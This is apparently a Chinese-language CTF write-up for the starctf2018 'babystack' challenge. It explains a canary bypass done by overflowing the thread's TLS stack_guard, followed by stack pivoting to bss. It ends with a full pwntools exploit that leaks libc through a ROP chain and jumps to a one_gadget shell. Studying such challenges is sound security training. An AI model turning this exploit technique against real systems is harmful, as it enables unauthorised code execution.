+++
title = "starctf2018_babystack--canary&栈迁移&TSL"
date = "2026-03-27"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
思路
pthread多线程利用
栈溢出覆盖`TLS`结构体中内容，来绕过canary保护
栈迁移到`bss`段去执行`onegadget`
主函数：
![Pasted image 20260327185902.png](%E9%99%84%E4%BB%B6/Pasted%20image%2020260327185902.png)


漏洞函数：可以栈溢出
![Pasted image 20260327185918.png](%E9%99%84%E4%BB%B6/Pasted%20image%2020260327185918.png)


基本知识
```c
/ sysdeps\x86_64\nptl\tls.h  
  
typedef struct  
{  
  void *tcb;    /* Pointer to the TCB.  Not necessarily the  
		         thread descriptor used by libpthread.  */  
  dtv_t *dtv;  
  void *self;   /* Pointer to the thread descriptor.  */  
  int multiple_threads;  
  int gscope_flag;  
  uintptr_t sysinfo;  
  uintptr_t stack_guard;  <===============
  uintptr_t pointer_guard;  
    
  ...   
} tcbhead_t;
```

在结构体 `tcbhead_t` 中，我们可以看到 `stack_guard` 字段，单个线程的 `canary` 值就存放在这里，函数退出时就是从这里取值与`canary`做异或。所以我们只要把他覆盖为和栈中`canary`一样的值就能绕过下面的检查：
![Pasted image 20260327185923.png](%E9%99%84%E4%BB%B6/Pasted%20image%2020260327185923.png)


那么接下来我们就需要找到输入点与`stack_guard` 字段之间的偏移，因为我尝试过多覆盖一点，但是这样会发生错误，可能是其他数据不能覆盖吧？？

所以我们还是精准覆盖，计算方法如下：我们输入数据的位置在`0x7ffff77c0ee0`，然后用 `p/x &(*(tcbhead_t*)(pthread_self())).stack_guard`，计算偏移：
![Pasted image 20260327185928.png](%E9%99%84%E4%BB%B6/Pasted%20image%2020260327185928.png)
exp：
```python
from pwn import *
from pwn import p64,u64,p32,u32,p8
 
context.terminal = ["tmux","sp","-h"]
context(log_level="debug",os="linux",arch="amd64")
 
# io=remote('node5.buuoj.cn',28304)
io = process("./pwn") 
 
elf=ELF("./pwn")
libc=ELF('/ctf/tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so')
 
sla = lambda x,y : io.sendlineafter(x,y)
sa  = lambda x,y : io.sendafter(x,y)
sl  = lambda x   : io.sendline(x)
sd  = lambda x   : io.send(x)
gd  = lambda     : gdb.attach(io)
inter = lambda   : io.interactive()
 
def pwn():
    pause()
    puts_plt = elf.plt["puts"]
    puts_got = elf.got["puts"]
    read_plt = elf.plt['read']
    prdi = 0x0000000000400c03
    prsi_r15 = 0x0000000000400c01
    one = [0x4f2a5,0x4f302,0x10a2fc]
    bss = elf.bss()
 
    sla(b"send?",str(0x1850))
    payload = b"a"*0x1010
    payload += p64(bss)
    # rop链调用put来泄露libc基址
    payload += p64(prdi) + p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(prdi) + p64(0)
    # read链向bss中写入onegadget
    payload += p64(prsi_r15) + p64(bss) + p64(0)
    payload += p64(read_plt)
    payload += p64(0x400955)
    # 将stack_guard覆盖为a，与前面的canary一样
    payload = payload.ljust(0x1850,b"a")
    sd(payload)
    pause()
    io.recvuntil("It's time to say goodbye.\n",drop=False)
    puts_addr=u64(io.recv(6).ljust(8,b'\x00'))
    print("puts_addr -------> "+hex(puts_addr))
 
    libc_base=puts_addr-libc.symbols['puts']
    payload=p64(0) + p64(libc_base+one[2])
    io.send(payload)
 
    inter()
 
pwn()
```
